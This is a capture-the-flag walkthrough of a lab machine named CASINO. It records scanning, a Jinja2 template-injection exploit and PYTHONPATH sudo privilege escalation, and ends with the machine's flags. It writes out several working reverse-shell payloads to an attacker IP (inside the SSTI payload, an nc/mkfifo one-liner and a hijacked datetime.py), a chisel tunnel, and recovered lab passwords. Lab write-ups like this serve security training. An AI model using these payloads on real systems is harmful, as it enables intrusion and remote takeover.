# CASINO

![](../.gitbook/assets/98ff2e8024e9440c95902888c312d1c5.png)

## NMAP SCAN

```text
PORT     STATE    SERVICE    REASON         VERSION
22/tcp   open     ssh        syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http       syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: River - Index
9000/tcp filtered cslistener no-response
```

## PORT 80 ENUMERATION

### GOBUSTER

```text
/search               (Status: 302) [Size: 209] [--> http://172.31.3.7/]
/login                (Status: 200) [Size: 3316]                        
/static               (Status: 301) [Size: 309] [--> http://172.31.3.7/static/]
/portal               (Status: 200) [Size: 4266]                               
/team                 (Status: 200) [Size: 3612]                               
/tos                  (Status: 200) [Size: 2892]                               
/play                 (Status: 302) [Size: 219] [--> http://172.31.3.7/login]  
/server-status        (Status: 403) [Size: 275]
```

### /LOGIN

![](../.gitbook/assets/a5ba144b01e44973bb460326f7caef3d.png)

### USERS \( ATTENTION TO "FLASK"\)

```text
Erlich Bachman
grey   (Newbie Flask Web Dev)
Carla
Dinesh
Gilfoyle
```

```text
Phil
Alan - How did you get banned from an arcade???
Stu
Mr. Chow
Doug
```

### /PORTAL

![](../.gitbook/assets/68bbb28803ac43bf9aba2f5c4c79a692.png)

## SERVER SIDE TEMPLATE INJECTION

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

![](../.gitbook/assets/3900925891c043eab22672b88c49a058.png)

![](../.gitbook/assets/eed4107b54cb4fde98b4209fc7c9a03a.png)

### EXPLOIT

* USE THIS COMMAND

```text
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.0.63\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

![](../.gitbook/assets/217f19d07485471d86fb93adfbff4952.png)

![](../.gitbook/assets/2acba8cba5384319b3640cf5ecffccf5.png)

## MACHINE ENUMERATION

### USERS WITH CONSOLE

```text
root:x:0:0:root:/root:/bin/bash
erlich:x:1000:1000:erlich:/home/erlich:/bin/bash
grey:x:1001:1001:,,,:/home/grey:/bin/bash
carla:x:1002:1002:,,,:/home/carla:/bin/bash
```

### WEBAPP DIRECTORY

![](../.gitbook/assets/55e8d051e468449a8a7a5f2b58de3eaa.png)

```text
i_L0v3$$$
```

* DOWNLOAD ZIP FILE

![](../.gitbook/assets/9bfafca0f7724bc9abc91bb46e4bd25b.png)

![](../.gitbook/assets/68aa1044d01c43c2aa743bf11651c0b8.png)

* APP.PY

![](../.gitbook/assets/b7a740bbabab49bfb3fcf09c3957f13e.png)

```text
grey:>F73SzS36>V$tJmc
```

![](../.gitbook/assets/0f00abeba45a43e2bf6f950adedf76aa.png)

```text
erlich:i_L0v3$$$
```

## LOGIN USING ERLICH CREDS

![](../.gitbook/assets/215e19fe8fc24a229bb37ee07d17b6b0.png)

### BTC

MAYBE SOME FORM OF EXPLOIT IN THE PARAMETER \(IF NEED IT WE CAME BACK\)

![](../.gitbook/assets/7064e077b63c454ba38274af7fd2a584.png)

![](../.gitbook/assets/aba51011e0fa47f4a08fcf7b0997cc5a.png)

![](../.gitbook/assets/582f5457418a4c8b9965f227ab3d2469.png)

## ENUMERATE & EXPLOIT PORT 9000

## UPLOAD CHISEL

* IN OUR ATTACKER MACHINE

```text
chisel server -p 8888 --reverse
```

![](../.gitbook/assets/6dc1e43eddb24df2815a5598d5ac11c2.png)

* IN VICTIM

```text
./chisel client 10.10.0.63:8888 R:9000:127.0.0.1:9000
```

![](../.gitbook/assets/d8c72e4d23d540ce8d2763d3d45ca881.png)

## DEVELOPER PLATFORM

![](../.gitbook/assets/2b2e6d3ca6dd403eaa1e134429753cba.png)

### GET A SHELL

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.63 9999 >/tmp/f
```

![](../.gitbook/assets/d37814a62bb04da89729ed3d35b0e412.png)

![](../.gitbook/assets/988465303e2f4d87a9f1384766c54e84.png)

## GREY HOME FOLDER

### .GIT

* GIT SHOW

![](../.gitbook/assets/3da7ccf502fe427ab4fd279986c46761.png)

```text
carla:>F73SzS36>V$tJmc
```

## PRIVESC

![](../.gitbook/assets/fca99ad2cdff4f95985db0d6a04797c9.png)

* WE CAN SET THE ENVIRONMENT IN SUDO MODE \(IN THIS CASE THE PYTHONPATH\)
* FILE "updateBTCPrice.py -rwxr-xr-x root\(WE CAN'T EDIT\)"

```python
#!/usr/bin/python3

from datetime import datetime
import requests

print(datetime.now())

try:
    price = requests.get("https://www.coinbase.com/price/bitcoin").text
    btcPrice = open('/var/www/webApp/webApp/templates/btc.price', 'w')
    btcPrice.write(price)
    btcPrice.close()
    import os
    os.system("service apache2 restart")
except:
    print("ERROR: Could not connect to coinbase!")
```

### MAKE OR UPLOAD A DATETIME.PY IN TMP OR DEV/SHM

REVERSE SHELL IN PYTHON

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.63",6325));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

![](../.gitbook/assets/2231b6b78312438da52a662c574ebf54.png)

RUN SUDO COMMAND

```bash
sudo PYTHONPATH=/tmp /opt/updateBTCPrice.py
```

![](../.gitbook/assets/028ae4a5099240388265c90a82c3c749.png)

## FLAGS

### USER

```text
69ee5d271b39d6aa19849dd8cbf516f3
```

### ROOT

```text
eea92150cdc75ba784e8d368b0ba36e0
```

